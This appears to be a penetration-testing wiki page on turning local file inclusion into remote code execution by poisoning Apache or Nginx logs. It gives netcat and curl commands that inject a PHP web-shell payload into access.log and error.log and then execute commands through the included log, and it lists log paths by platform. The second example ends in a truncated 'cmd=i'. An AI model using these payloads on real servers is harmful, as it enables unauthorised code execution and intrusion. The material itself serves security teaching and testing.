# Log poisoning

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning" %}

### /var/log/apache2/access.log

When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.

* **About `access.log`**: records all requests processed by the server.
* **About netcat**: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
* Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
* FreeBSD Apache access log file location: `/var/log/httpd-access.log`
* Windows Apache access log file location: \*\*\*\* `C:\xampp\apache\logs`

Or if the web server is under Nginx :

* Linux Nginx access log file location: `/var/log/nginx/access.log`
* Windows Nginx access log file location: `C:\nginx\log`

### /var/log/apache/error.log

This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=i
```
